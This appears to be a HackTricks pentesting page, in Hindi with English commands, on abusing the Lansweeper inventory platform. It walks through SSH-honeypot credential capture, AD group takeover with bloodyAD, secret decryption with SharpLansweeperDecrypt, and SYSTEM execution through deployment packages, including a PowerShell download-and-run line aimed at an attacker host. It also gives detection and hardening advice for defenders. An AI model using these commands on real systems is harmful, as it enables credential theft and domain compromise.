# Lansweeper का दुरुपयोग: Credential Harvesting, Secrets Decryption और Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper एक IT asset discovery और inventory platform है, जिसे आमतौर पर Windows पर deploy किया जाता है और Active Directory के साथ integrate किया जाता है। Lansweeper में configure किए गए credentials का उपयोग इसके scanning engines द्वारा SSH, SMB/WMI और WinRM जैसे protocols के माध्यम से assets पर authenticate करने के लिए किया जाता है। Misconfigurations अक्सर निम्नलिखित की अनुमति देती हैं:

- किसी scanning target को attacker-controlled host (honeypot) पर redirect करके credential interception
- Lansweeper-related groups द्वारा exposed AD ACLs का abuse करके remote access प्राप्त करना
- Host पर Lansweeper-configured secrets (connection strings और stored scanning credentials) को decrypt करना
- Deployment feature के माध्यम से managed endpoints पर code execution (अक्सर SYSTEM के रूप में चलना)

यह page engagements के दौरान इन behaviors का abuse करने वाले practical attacker workflows और commands का सारांश प्रस्तुत करता है।

## 1) Honeypot के माध्यम से scanning credentials harvest करना (SSH example)

विचार: ऐसा Scanning Target create करें जो आपके host की ओर point करे और मौजूदा Scanning Credentials को उससे map करें। जब scan चलेगा, Lansweeper उन credentials के साथ authenticate करने का प्रयास करेगा और आपका honeypot उन्हें capture कर लेगा।<sup>[[1]](#references)</sup>

Steps overview (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (या Single IP) = आपका VPN IP
- SSH port को किसी reachable port पर configure करें (जैसे, यदि 22 blocked हो तो 2022)
- Schedule disable करें और manually trigger करने की योजना बनाएं
- Scanning → Scanning Credentials → सुनिश्चित करें कि Linux/SSH creds मौजूद हों; उन्हें नए target से map करें (आवश्यकतानुसार सभी enable करें)
- Target पर “Scan now” पर click करें
- SSH honeypot चलाएं और attempted username/password retrieve करें

sshesame के साथ example:<sup>[[2]](#references)</sup>
```yaml
# sshesame.yaml
server:
listen_address: 0.0.0.0:2022
```

```bash
# Prefer a current release/container; the package in Debian-derived repositories may be stale
sshesame -config sshesame.yaml

# Or run the maintained container image
docker run --rm -it -p 2022:2022 \
-v "$PWD/sshesame.yaml:/config.yaml:ro" ghcr.io/jaksi/sshesame
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
DC services के विरुद्ध captured creds validate करें:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Notes
- अन्य protocols equivalent नहीं हैं: SMB/WinRM listener सामान्यतः cleartext password के बजाय NTLM challenge-response प्राप्त करता है। इसे crack या relay करना negotiated protocol protections पर निर्भर करता है; [network poisoning and relay attacks](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) देखें। SSH password authentication सामान्यतः सबसे सरल cleartext case है।
- SSH public-key authentication server के सामने username और public-key fingerprint उजागर करता है, **private key या उसके passphrase को नहीं**। Honeypot से इनके disclose होने की अपेक्षा करने के बजाय compromised Lansweeper server से key-backed credentials recover करें।<sup>[[2]](#references)</sup>
- कई scanners अलग-अलग client banners (जैसे, RebexSSH) से अपनी पहचान बताते हैं और benign commands (uname, whoami, आदि) चलाने का प्रयास करेंगे।

### Credential selection order महत्वपूर्ण है

Rescan के लिए, Lansweeper पहले उस asset के लिए पिछली बार सफल हुए credential को retry करता है, फिर उनके configured order में explicitly mapped credentials को, और अंत में उसी type के global credential को। इसलिए, जो honeypot पहले password authentication को स्वीकार कर लेता है, वह सामान्यतः बाद के fallback credentials को observe नहीं करेगा; authorized credential-path assessment के दौरान, यदि उद्देश्य पूरी fallback sequence को verify करना है, तो attempts को log और reject करें।<sup>[[6]](#references)</sup>

## 2) AD ACL abuse: स्वयं को app-admin group में जोड़कर remote access प्राप्त करें

Compromised account से effective rights enumerate करने के लिए BloodHound का उपयोग करें। एक सामान्य finding scanner- या app-specific group (जैसे, “Lansweeper Discovery”) का किसी privileged group (जैसे, “Lansweeper Admins”) पर GenericAll रखना है। यदि privileged group “Remote Management Users” का भी member है, तो स्वयं को जोड़ने के बाद WinRM उपलब्ध हो जाता है।<sup>[[1]](#references)[[5]](#references)</sup>

Collection examples:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
group पर BloodyAD के साथ GenericAll exploit करें (Linux):<sup>[[4]](#references)</sup>
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
फिर एक interactive shell प्राप्त करें:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
सुझाव: Kerberos operations समय-संवेदनशील होते हैं। यदि आपको KRB_AP_ERR_SKEW मिले, तो पहले DC के साथ sync करें:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Host पर Lansweeper-configured secrets को Decrypt करना

Lansweeper server पर, ASP.NET site आमतौर पर application द्वारा उपयोग की जाने वाली एक encrypted connection string और symmetric key store करती है। उपयुक्त local access के साथ, आप DB connection string को decrypt कर सकते हैं और फिर stored scanning credentials extract कर सकते हैं।<sup>[[1]](#references)</sup>

सामान्य locations:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Stored creds की decryption और dumping को automate करने के लिए SharpLansweeperDecrypt का उपयोग करें। बिना arguments के, current executable `web.config` को decrypt करता है, database से connect करता है और सभी configured scanning credentials dump करता है; `-e` offline/manual decryption को भी support करता है, जब encrypted value और key file पहले से उपलब्ध हों:<sup>[[3]](#references)</sup>
```powershell
# Automatic: use the default web.config and Encryption.txt locations
.\SharpLansweeperDecrypt.exe

# Manual: decrypt one database value with an explicit key file
.\SharpLansweeperDecrypt.exe -e '<encrypted-base64-value>' `
-p 'C:\Program Files (x86)\Lansweeper\Key\Encryption.txt'

# The repository also provides LansweeperDecrypt.ps1 when loading .NET tooling is unsuitable
powershell -ExecutionPolicy Bypass -File .\LansweeperDecrypt.ps1
```
अपेक्षित output में DB connection details और plaintext scanning credentials शामिल होते हैं, जैसे पूरे estate में उपयोग किए जाने वाले Windows और Linux accounts। इन accounts के पास अक्सर domain hosts पर elevated local rights होते हैं:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
विशेषाधिकार प्राप्त पहुंच के लिए बरामद Windows scanning creds का उपयोग करें:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

“Lansweeper Admins” के सदस्य के रूप में, web UI में Deployment और Configuration दिखाई देते हैं। Deployment → Deployment packages के अंतर्गत, आप ऐसे packages बना सकते हैं जो target किए गए assets पर arbitrary commands चलाते हैं। Lansweeper target के Task Scheduler और `C$` तक पहुंचने के लिए administrative scanning credential का उपयोग करता है, फिर deployment के लिए एक task बनाता है। जब package में **System Account** run mode का उपयोग किया जाता है, तो payload `NT AUTHORITY\SYSTEM` के रूप में execute होता है; अन्य run modes mapped scanning credential या वर्तमान में logged-on user का उपयोग कर सकते हैं, इसलिए SYSTEM मान लेने के बजाय चुने गए mode को verify करें।<sup>[[1]](#references)[[7]](#references)</sup>

High-level steps:
- ऐसा नया Deployment package बनाएं जो PowerShell या cmd one-liner (reverse shell, add-user आदि) चलाए।
- वांछित asset को target करें (जैसे वह DC/host जहां Lansweeper चलता है) और Deploy/Run now पर क्लिक करें।
- अपना shell SYSTEM के रूप में प्राप्त करें।

Example payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Deployment actions शोरपूर्ण होते हैं और Lansweeper तथा Windows event logs में logs छोड़ते हैं। इनका विवेकपूर्ण उपयोग करें।

### Deployment artifacts और दूसरा credential exposure point

Scanner अपना deployment executable `C:\Windows\LSDeployment` के अंतर्गत `C$` के माध्यम से लिखता है। Package files सामान्यतः `DefaultPackageShare$` से पढ़ी जाती हैं, जो `C:\Program Files (x86)\Lansweeper\PackageShare` द्वारा backed होती है, या किसी IP-range-specific package share से। महत्वपूर्ण रूप से, Lansweeper दस्तावेज़ करता है कि package-share credential को **हर उस computer की registry में reversibly encrypted form में संग्रहीत किया जाता है, जिसे deployment प्राप्त होता है**। किसी compromised managed endpoint को उस share account के संभावित disclosure point के रूप में मानें, और Lansweeper activity को पुनर्निर्मित करते समय deployment directory, scheduled-task history तथा configured package shares का निरीक्षण करें।<sup>[[7]](#references)</sup>

## Detection and hardening

- Anonymous SMB enumerations को restrict या remove करें। RID cycling और Lansweeper shares तक anomalous access की निगरानी करें।
- Egress controls: scanner hosts से outbound SSH/SMB/WinRM को block या कड़ाई से restrict करें। Non-standard ports (जैसे, 2022) और Rebex जैसे unusual client banners पर alert करें।
- `Website\\web.config` और `Key\\Encryption.txt` को सुरक्षित रखें। Secrets को vault में externalize करें और exposure होने पर rotate करें। Minimal privileges वाले service accounts और जहाँ संभव हो gMSA का उपयोग करने पर विचार करें।
- AD monitoring: Lansweeper-related groups (जैसे, “Lansweeper Admins”, “Remote Management Users”) में changes और privileged groups पर GenericAll/Write membership प्रदान करने वाले ACL changes पर alert करें।
- Deployment package creations/changes/executions का audit करें और नए remote scheduled tasks को `C:\Windows\LSDeployment` में writes के साथ correlate करें; ऐसे packages पर alert करें जो `cmd.exe`/`powershell.exe` spawn करते हों या unexpected outbound connections बनाते हों।
- Package-share credentials को केवल **Read & Execute** permission दें और उन्हें administration के लिए कभी reuse न करें। जहाँ व्यावहारिक हो, agent-based inventory को प्राथमिकता दें: यदि सभी computers को agent द्वारा scan किया जाता है और deployment module unused है, तो Lansweeper को stored computer scanning credentials की आवश्यकता नहीं होती।<sup>[[6]](#references)[[7]](#references)</sup>

## Related topics
- [SMB/LSA/SAMR enumeration और RID cycling](../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md)
- [Kerberos authentication और clock-skew considerations](kerberos-authentication.md)
- [BloodHound path analysis](bloodhound.md)
- [WinRM usage और lateral movement](../lateral-movement/winrm.md)



## References
- [1] [HTB: Sweep — Lansweeper Scanning, AD ACLs और Secrets का दुरुपयोग करके DC पर अधिकार प्राप्त करना (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [2] [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)
- [6] [Scanning credentials बनाएं और map करें — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/create-and-map-scanning-credentials)
- [7] [Deployment requirements — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/deployment-requirements)
{{#include ../../banners/hacktricks-training.md}}
